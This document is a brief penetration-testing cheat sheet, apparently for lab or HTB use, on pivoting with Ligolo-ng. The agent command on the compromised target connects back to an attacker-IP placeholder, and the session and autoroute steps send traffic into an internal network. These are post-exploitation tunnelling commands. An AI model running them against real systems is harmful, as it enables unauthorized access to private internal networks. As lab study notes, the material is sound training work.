>[!note]
>We need 2 things:
>**Agent** → uploaded and executed on the target machine
>**Proxy** → running on the attacker machine to receive the connection

### On attacker

```sh
ligolo-proxy -selfcert -v
```

### On target

```sh
./agent -connect <attacker_ip>:11601 -ignore-cert
```

`-ignore-cert` skips verification (good enough for labs or HTB)

---

## After the Agent Connects

You should see something like:

`Agent joined. id=005056941001 name=ubuntu@WEB01 remote="10.129.192.209:44566"`

1. Run:
```sh
session
```
2. Select the **ID** of the connected agent.
3. Run:
```sh
autoroute
```
4. Choose the internal network or IP range you want to access.

Once configured, traffic to the selected internal network will be routed through the compromised host.

